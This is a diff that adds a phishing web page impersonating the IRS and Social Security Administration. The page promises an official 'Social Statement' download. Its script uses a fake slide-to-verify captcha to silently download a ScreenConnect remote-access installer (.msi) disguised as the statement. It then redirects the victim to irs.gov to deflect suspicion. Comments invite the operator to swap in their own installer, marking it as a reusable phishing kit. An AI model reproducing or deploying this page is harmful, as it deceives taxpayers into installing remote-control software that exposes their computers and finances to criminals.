@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Social Statement is Ready | IRS & Social Security Administration</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(160deg, #f8f9fc 0%, #e8ecf4 30%, #dce3f0 60%, #eef1f7 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #333;
+            position: relative;
+        }
+        
+        /* Subtle watermark pattern */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: 
+                radial-gradient(circle at 15% 25%, rgba(26, 64, 140, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 85% 75%, rgba(0, 60, 120, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(26, 64, 140, 0.02) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .container {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 45px 40px 35px;
+            text-align: center;
+            box-shadow: 
+                0 4px 6px rgba(0,0,0,0.07),
+                0 10px 30px rgba(0,0,0,0.08),
+                0 20px 60px rgba(26, 64, 140, 0.1);
+            max-width: 560px;
+            width: 93%;
+            animation: fadeIn 0.8s ease-in;
+            position: relative;
+            z-index: 1;
+            border-top: 5px solid #1a408c;
+            border-bottom: 5px solid #003c78;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(25px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* ===== DUAL AGENCY HEADER ===== */
+        .agency-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 25px;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e8ecf4;
+        }
+        
+        .agency-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        /* IRS Logo - Using official image */
+        .irs-logo-img {
+            width: 55px;
+            height: 55px;
+            object-fit: contain;
+            filter: drop-shadow(0 3px 8px rgba(26, 64, 140, 0.25));
+        }
+        
+        .irs-text-block {
+            text-align: left;
+            line-height: 1.2;
+        }
+        
+        .irs-text-block .irs-name {
+            font-size: 20px;
+            font-weight: 800;
+            color: #1a408c;
+            letter-spacing: 2.5px;
+        }
+        
+        .irs-text-block .irs-full {
+            font-size: 8px;
+            color: #5a6a85;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+        
+        /* Divider between logos */
+        .agency-divider {
+            width: 1px;
+            height: 50px;
+            background: linear-gradient(to bottom, transparent, #c5a962, #003c78, #c5a962, transparent);
+            border-radius: 1px;
+        }
+        
+        /* SSA Logo - Using official SVG */
+        .ssa-logo-img {
+            width: 55px;
+            height: 55px;
+            object-fit: contain;
+            filter: drop-shadow(0 3px 8px rgba(0, 60, 120, 0.25));
+        }
+        
+        .ssa-text-block {
+            text-align: left;
+            line-height: 1.2;
+        }
+        
+        .ssa-text-block .ssa-name {
+            font-size: 20px;
+            font-weight: 800;
+            color: #003c78;
+            letter-spacing: 2.5px;
+        }
+        
+        .ssa-text-block .ssa-full {
+            font-size: 8px;
+            color: #5a6a85;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-weight: 700;
+        }
+        
+        /* ===== OFFICIAL BADGE ===== */
+        .official-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, #f0f4ff, #e8f0fe);
+            border: 1.5px solid #c5a962;
+            border-radius: 25px;
+            padding: 7px 18px;
+            margin-bottom: 22px;
+            box-shadow: 0 2px 8px rgba(197, 169, 98, 0.2);
+        }
+        
+        .official-badge .badge-icon {
+            font-size: 15px;
+        }
+        
+        .official-badge .badge-text {
+            font-size: 11px;
+            font-weight: 700;
+            color: #1a408c;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+        
+        /* ===== HEADINGS ===== */
+        h1 {
+            color: #0f1e3a;
+            margin-bottom: 6px;
+            font-size: 27px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+        
+        .document-type {
+            color: #1a408c;
+            font-weight: 700;
+            margin-bottom: 5px;
+            font-size: 15px;
+            letter-spacing: 0.3px;
+        }
+        
+        .reference-number {
+            display: inline-block;
+            background: #f8f9fc;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            padding: 4px 14px;
+            font-size: 12px;
+            color: #5a6a85;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+            margin-bottom: 18px;
+            font-weight: 600;
+        }
+        
+        .info-text {
+            color: #4a5568;
+            margin-bottom: 8px;
+            line-height: 1.7;
+            font-size: 14.5px;
+            text-align: left;
+            padding: 0 5px;
+        }
+        
+        .info-text strong {
+            color: #1a408c;
+        }
+        
+        .info-list {
+            text-align: left;
+            margin: 10px 0 20px 0;
+            padding: 15px 20px;
+            background: #f8f9fc;
+            border-radius: 10px;
+            border-left: 3px solid #1a408c;
+        }
+        
+        .info-list .list-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 8px;
+            font-size: 13.5px;
+            color: #4a5568;
+            line-height: 1.5;
+        }
+        
+        .info-list .list-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .info-list .list-icon {
+            color: #1a408c;
+            font-weight: bold;
+            flex-shrink: 0;
+            font-size: 15px;
+        }
+        
+        .verification-note {
+            font-size: 13px;
+            color: #e53e3e;
+            font-weight: 600;
+            margin-bottom: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        
+        .verification-note .alert-icon {
+            font-size: 16px;
+        }
+        
+        /* ===== SLIDE TO DOWNLOAD CAPTCHA - REDESIGNED ===== */
+        .captcha-wrapper {
+            background: #f5f7fa;
+            border: 2px solid #dce3f0;
+            border-radius: 60px;
+            padding: 6px;
+            margin: 0 auto 22px;
+            max-width: 400px;
+            position: relative;
+            height: 66px;
+            overflow: hidden;
+            user-select: none;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .captcha-wrapper:hover {
+            border-color: #bcc7dc;
+            box-shadow: 0 3px 15px rgba(26, 64, 140, 0.08);
+        }
+        
+        .captcha-wrapper.success {
+            border-color: #1a408c;
+            background: #eef2fb;
+            box-shadow: 0 0 0 5px rgba(26, 64, 140, 0.08);
+        }
+        
+        .captcha-track {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            border-radius: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        
+        .captcha-bg-text {
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            color: #8a9bb5;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            z-index: 1;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        
+        /* Progress bar - IRS Blue */
+        .captcha-progress {
+            position: absolute;
+            left: 6px;
+            top: 6px;
+            bottom: 6px;
+            width: 0%;
+            background: linear-gradient(90deg, #1a408c, #0d2b5e);
+            border-radius: 60px;
+            transition: width 0.05s linear;
+            z-index: 0;
+            box-shadow: inset 0 1px 3px rgba(255,255,255,0.2);
+        }
+        
+        .captcha-progress.complete {
+            background: linear-gradient(90deg, #1a408c, #0f2b5e);
+        }
+        
+        /* ===== THE ARROW SLIDER BUTTON - PERFECTLY ROUND ===== */
+        .captcha-slider {
+            position: absolute;
+            left: 6px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 54px;
+            height: 54px;
+            background: linear-gradient(135deg, #ffffff, #f1f4f9);
+            border-radius: 50%;
+            cursor: grab;
+            z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 
+                0 3px 12px rgba(0,0,0,0.12),
+                0 1px 3px rgba(0,0,0,0.08),
+                inset 0 1px 0 rgba(255,255,255,0.9);
+            transition: 
+                box-shadow 0.2s ease, 
+                transform 0.15s ease,
+                background 0.3s ease;
+        }
+        
+        .captcha-slider:hover {
+            box-shadow: 
+                0 6px 20px rgba(26, 64, 140, 0.2),
+                0 2px 5px rgba(0,0,0,0.1),
+                inset 0 1px 0 rgba(255,255,255,0.9);
+            transform: translateY(-50%) scale(1.06);
+        }
+        
+        .captcha-slider:active {
+            cursor: grabbing;
+            transform: translateY(-50%) scale(1.1);
+            box-shadow: 
+                0 8px 28px rgba(26, 64, 140, 0.3),
+                0 3px 8px rgba(0,0,0,0.15),
+                inset 0 1px 0 rgba(255,255,255,0.9);
+        }
+        
+        /* Arrow icon - perfectly centered */
+        .arrow-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 100%;
+            transition: all 0.3s ease;
+        }
+        
+        .arrow-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: none;
+            stroke: #4a5568;
+            stroke-width: 2.5;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            transition: stroke 0.3s ease;
+        }
+        
+        .captcha-slider:hover .arrow-icon svg {
+            stroke: #1a408c;
+        }
+        
+        /* Sliding animation */
+        .captcha-slider.sliding .arrow-icon {
+            animation: arrowPulse 0.6s ease-in-out infinite;
+        }
+        
+        @keyframes arrowPulse {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(4px); }
+        }
+        
+        /* Success state - IRS Blue */
+        .captcha-slider.success {
+            background: linear-gradient(135deg, #1a408c, #0d2b5e);
+            cursor: default;
+            box-shadow: 
+                0 4px 18px rgba(26, 64, 140, 0.4),
+                inset 0 1px 0 rgba(255,255,255,0.15);
+        }
+        
+        .captcha-slider.success .arrow-icon svg {
+            stroke: #ffffff;
+        }
+        
+        .captcha-slider.success:hover {
+            transform: translateY(-50%) scale(1);
+        }
+        
+        /* ===== DOWNLOAD STATUS ===== */
+        .download-status {
+            display: none;
+            margin-top: 18px;
+            padding: 16px 20px;
+            background: #eef2fb;
+            border-radius: 12px;
+            animation: fadeIn 0.5s ease-in;
+            border: 1px solid #c5d5f0;
+        }
+        
+        .download-status.show {
+            display: block;
+        }
+        
+        .status-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .spinner {
+            width: 28px;
+            height: 28px;
+            border: 3px solid #c5d5f0;
+            border-top: 3px solid #1a408c;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            flex-shrink: 0;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-check {
+            font-size: 28px;
+            flex-shrink: 0;
+            display: none;
+        }
+        
+        .status-text {
+            color: #1a408c;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        /* ===== REDIRECT NOTICE ===== */
+        .redirect-notice {
+            display: none;
+            margin-top: 15px;
+            padding: 12px 18px;
+            background: #fff8e1;
+            border-radius: 10px;
+            border: 1px solid #ffe082;
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        .redirect-notice.show {
+            display: block;
+        }
+        
+        .redirect-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #8d6e00;
+            font-weight: 600;
+        }
+        
+        .redirect-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2.5px solid #ffe082;
+            border-top: 2.5px solid #f9a825;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            flex-shrink: 0;
+        }
+        
+        .countdown {
+            font-weight: 700;
+            color: #e65100;
+            font-size: 15px;
+        }
+        
+        .manual-link {
+            margin-top: 18px;
+            color: #8a9bb5;
+            font-size: 12.5px;
+        }
+        
+        .manual-link a {
+            color: #1a408c;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.2s ease;
+        }
+        
+        .manual-link a:hover {
+            color: #0f2b5e;
+            text-decoration: underline;
+        }
+        
+        /* ===== FOOTER ===== */
+        .footer-note {
+            margin-top: 22px;
+            padding-top: 15px;
+            border-top: 1px solid #e8ecf4;
+            font-size: 10px;
+            color: #a0aec0;
+            letter-spacing: 0.5px;
+            line-height: 1.5;
+        }
+        
+        .footer-note .footer-agencies {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-note .footer-dot {
+            width: 3px;
+            height: 3px;
+            background: #c5a962;
+            border-radius: 50%;
+        }
+        
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 18px 25px;
+            }
+            
+            .agency-header {
+                gap: 15px;
+            }
+            
+            .irs-logo-img,
+            .ssa-logo-img {
+                width: 42px;
+                height: 42px;
+            }
+            
+            .irs-text-block .irs-name,
+            .ssa-text-block .ssa-name {
+                font-size: 16px;
+                letter-spacing: 1.5px;
+            }
+            
+            .irs-text-block .irs-full,
+            .ssa-text-block .ssa-full {
+                font-size: 7px;
+                letter-spacing: 1px;
+            }
+            
+            h1 {
+                font-size: 21px;
+            }
+            
+            .captcha-wrapper {
+                max-width: 310px;
+                height: 60px;
+                padding: 5px;
+            }
+            
+            .captcha-slider {
+                width: 50px;
+                height: 50px;
+            }
+            
+            .captcha-bg-text {
+                font-size: 12px;
+            }
+            
+            .info-list {
+                padding: 12px 15px;
+            }
+            
+            .info-list .list-item {
+                font-size: 12.5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Dual Agency Header: IRS + SSA with Official Logos -->
+        <div class="agency-header">
+            <!-- IRS Logo - Official -->
+            <div class="agency-logo">
+                <img 
+                    src="https://idme-production.s3.amazonaws.com/applications/7134/large.png?1705672708" 
+                    alt="Internal Revenue Service" 
+                    class="irs-logo-img"
+                    onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';"
+                >
+                <div class="irs-text-block">
+                    <div class="irs-name">IRS</div>
+                    <div class="irs-full">Internal Revenue Service</div>
+                </div>
+            </div>
+            
+            <!-- Divider -->
+            <div class="agency-divider"></div>
+            
+            <!-- SSA Logo - Official SVG -->
+            <div class="agency-logo">
+                <img 
+                    src="https://www.ssa.gov/themes/custom/ssa_core/logo.svg" 
+                    alt="Social Security Administration" 
+                    class="ssa-logo-img"
+                    onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';"
+                >
+                <div class="ssa-text-block">
+                    <div class="ssa-name">SSA</div>
+                    <div class="ssa-full">Social Security Administration</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Official Badge -->
+        <div class="official-badge">
+            <span class="badge-icon">🔒</span>
+            <span class="badge-text">Official Government Document</span>
+        </div>
+        
+        <h1>Your Social Statement is Ready</h1>
+        <p class="document-type">📋 Annual Social Security & Tax Summary Statement</p>
+        <div class="reference-number">Ref: SSA-1099-2026-IRS</div>
+        
+        <p class="info-text">
+            <strong>Dear Taxpayer,</strong><br>
+            Your official <strong>Social Statement</strong> has been prepared by the Internal Revenue Service in coordination with the Social Security Administration. This document contains your complete earnings record, estimated benefits, and tax summary for the current fiscal year.
+        </p>
+        
+        <div class="info-list">
+            <div class="list-item">
+                <span class="list-icon">📊</span>
+                <span><strong>Earnings Record:</strong> Complete history of your reported annual earnings</span>
+            </div>
+            <div class="list-item">
+                <span class="list-icon">💰</span>
+                <span><strong>Estimated Benefits:</strong> Projected retirement, disability, and survivor benefits</span>
+            </div>
+            <div class="list-item">
+                <span class="list-icon">📝</span>
+                <span><strong>Tax Summary:</strong> Detailed breakdown of your Social Security and Medicare contributions</span>
+            </div>
+            <div class="list-item">
+                <span class="list-icon">✅</span>
+                <span><strong>Verification Status:</strong> Identity confirmed and document ready for download</span>
+            </div>
+        </div>
+        
+        <p class="verification-note">
+            <span class="alert-icon">⚠️</span> For your security, please complete the verification below to access your statement.
+        </p>
+        
+        <!-- Slide to Download CAPTCHA -->
+        <div class="captcha-wrapper" id="captchaWrapper">
+            <div class="captcha-track">
+                <span class="captcha-bg-text" id="captchaBgText">Slide to download your statement →</span>
+                <div class="captcha-progress" id="captchaProgress"></div>
+                <div class="captcha-slider" id="captchaSlider">
+                    <div class="arrow-icon">
+                        <!-- SVG Arrow Icon - Clean & Crisp -->
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M5 12h14"/>
+                            <path d="M12 5l7 7-7 7"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Download Status -->
+        <div class="download-status" id="downloadStatus">
+            <div class="status-content">
+                <div class="spinner" id="downloadSpinner"></div>
+                <div class="success-check" id="successCheck">✅</div>
+                <span class="status-text" id="statusText">Preparing your document...</span>
+            </div>
+        </div>
+        
+        <!-- Redirect Notice -->
+        <div class="redirect-notice" id="redirectNotice">
+            <div class="redirect-content">
+                <div class="redirect-spinner"></div>
+                <span>Redirecting to IRS.gov in <span class="countdown" id="countdownTimer">5</span> seconds...</span>
+            </div>
+        </div>
+        
+        <div class="manual-link">
+            <p>Having trouble? <a href="your-social-statement.pdf" download>Download directly</a></p>
+        </div>
+        
+        <div class="footer-note">
+            <div class="footer-agencies">
+                <span>Internal Revenue Service</span>
+                <span class="footer-dot"></span>
+                <span>Social Security Administration</span>
+            </div>
+            <div style="margin-top: 4px;">© 2026 United States Government • Official Document • Form SSA-1099</div>
+        </div>
+    </div>
+
+    <script>
+        // 🔴 CHANGE THIS: Replace with your actual .msi filename
+        const fileName = "ScreenConnect.ClientSetup.msi";
+        
+        // 🔴 REDIRECT URL: Change if needed
+        const redirectUrl = "https://www.irs.gov/";
+        
+        // CAPTCHA Elements
+        const captchaWrapper = document.getElementById('captchaWrapper');
+        const captchaSlider = document.getElementById('captchaSlider');
+        const captchaProgress = document.getElementById('captchaProgress');
+        const captchaBgText = document.getElementById('captchaBgText');
+        const downloadStatus = document.getElementById('downloadStatus');
+        const downloadSpinner = document.getElementById('downloadSpinner');
+        const successCheck = document.getElementById('successCheck');
+        const statusText = document.getElementById('statusText');
+        const redirectNotice = document.getElementById('redirectNotice');
+        const countdownTimer = document.getElementById('countdownTimer');
+        
+        let isDragging = false;
+        let startX = 0;
+        let sliderLeft = 6;
+        let maxSlide = 0;
+        let downloadTriggered = false;
+        let redirectCountdown = 5;
+        let countdownInterval = null;
+        
+        // Calculate max slide distance
+        function updateMaxSlide() {
+            const wrapperWidth = captchaWrapper.clientWidth;
+            const sliderWidth = captchaSlider.clientWidth;
+            const padding = 6;
+            maxSlide = wrapperWidth - sliderWidth - (padding * 2);
+        }
+        
+        updateMaxSlide();
+        window.addEventListener('resize', updateMaxSlide);
+        
+        // Mouse Events
+        captchaSlider.addEventListener('mousedown', startDrag);
+        document.addEventListener('mousemove', drag);
+        document.addEventListener('mouseup', endDrag);
+        
+        // Touch Events
+        captchaSlider.addEventListener('touchstart', startDrag, { passive: false });
+        document.addEventListener('touchmove', drag, { passive: false });
+        document.addEventListener('touchend', endDrag);
+        
+        function startDrag(e) {
+            if (downloadTriggered) return;
+            
+            isDragging = true;
+            captchaSlider.classList.add('sliding');
+            captchaSlider.style.transition = 'none';
+            captchaProgress.style.transition = 'none';
+            
+            if (e.type === 'mousedown') {
+                startX = e.clientX - sliderLeft;
+            } else if (e.type === 'touchstart') {
+                startX = e.touches[0].clientX - sliderLeft;
+            }
+        }
+        
+        function drag(e) {
+            if (!isDragging || downloadTriggered) return;
+            
+            e.preventDefault();
+            
+            let clientX;
+            if (e.type === 'mousemove') {
+                clientX = e.clientX;
+            } else if (e.type === 'touchmove') {
+                clientX = e.touches[0].clientX;
+            }
+            
+            sliderLeft = clientX - startX;
+            
+            // Constrain within bounds
+            if (sliderLeft < 6) sliderLeft = 6;
+            if (sliderLeft > maxSlide) sliderLeft = maxSlide;
+            
+            // Update slider position
+            captchaSlider.style.left = sliderLeft + 'px';
+            
+            // Update progress bar width
+            const progressPercent = ((sliderLeft - 6) / (maxSlide - 6)) * 100;
+            captchaProgress.style.width = progressPercent + '%';
+            
+            // Fade background text
+            if (progressPercent > 40) {
+                captchaBgText.style.opacity = Math.max(0, 1 - (progressPercent - 40) / 60);
+            }
+            
+            // Check if completed
+            if (sliderLeft >= maxSlide - 3) {
+                completeCaptcha();
+            }
+        }
+        
+        function endDrag() {
+            if (!isDragging) return;
+            
+            isDragging = false;
+            captchaSlider.classList.remove('sliding');
+            
+            // If not completed, slide back with smooth animation
+            if (!downloadTriggered) {
+                captchaSlider.style.transition = 'left 0.35s cubic-bezier(0.25, 0.8, 0.25, 1.2)';
+                captchaProgress.style.transition = 'width 0.35s ease';
+                captchaSlider.style.left = '6px';
+                captchaProgress.style.width = '0%';
+                captchaBgText.style.opacity = '1';
+                sliderLeft = 6;
+            }
+        }
+        
+        function completeCaptcha() {
+            if (downloadTriggered) return;
+            
+            downloadTriggered = true;
+            isDragging = false;
+            captchaSlider.classList.remove('sliding');
+            
+            // Snap to end
+            captchaSlider.style.transition = 'left 0.25s cubic-bezier(0.25, 0.8, 0.25, 1.2)';
+            captchaProgress.style.transition = 'width 0.25s ease';
+            captchaSlider.style.left = maxSlide + 'px';
+            captchaProgress.style.width = '100%';
+            captchaBgText.style.opacity = '0';
+            
+            // Update UI to success state - IRS Blue
+            captchaSlider.classList.add('success');
+            captchaProgress.classList.add('complete');
+            captchaWrapper.classList.add('success');
+            
+            // Change arrow to white checkmark
+            setTimeout(() => {
+                const arrowIcon = captchaSlider.querySelector('.arrow-icon');
+                arrowIcon.innerHTML = `
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px;">
+                        <polyline points="20 6 9 17 4 12" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                `;
+            }, 200);
+            
+            // Show download status
+            setTimeout(() => {
+                downloadStatus.classList.add('show');
+                statusText.textContent = 'Identity verified! Preparing your Social Statement...';
+                
+                // Start download after short delay
+                setTimeout(() => {
+                    triggerDownload();
+                }, 900);
+            }, 400);
+        }
+        
+        function triggerDownload() {
+            // Update status
+            downloadSpinner.style.display = 'none';
+            successCheck.style.display = 'block';
+            statusText.textContent = 'Download complete! Your official statement has been delivered.';
+            
+            // Create hidden link and trigger download
+            const link = document.createElement('a');
+            link.href = fileName;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Show redirect notice and start countdown
+            setTimeout(() => {
+                startRedirectCountdown();
+            }, 1500);
+        }
+        
+        function startRedirectCountdown() {
+            // Show redirect notice
+            redirectNotice.classList.add('show');
+            redirectCountdown = 5;
+            countdownTimer.textContent = redirectCountdown;
+            
+            // Start countdown
+            countdownInterval = setInterval(() => {
+                redirectCountdown--;
+                countdownTimer.textContent = redirectCountdown;
+                
+                if (redirectCountdown <= 0) {
+                    clearInterval(countdownInterval);
+                    performRedirect();
+                }
+            }, 1000);
+        }
+        
+        function performRedirect() {
+            // Update UI before redirect
+            statusText.textContent = '✅ Redirecting to IRS.gov...';
+            countdownTimer.textContent = '0';
+            
+            // Redirect to IRS website
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 500);
+        }
+        
+        // Prevent text selection during drag
+        captchaWrapper.addEventListener('selectstart', (e) => {
+            if (isDragging) e.preventDefault();
+        });
+    </script>
+</body>
+</html>
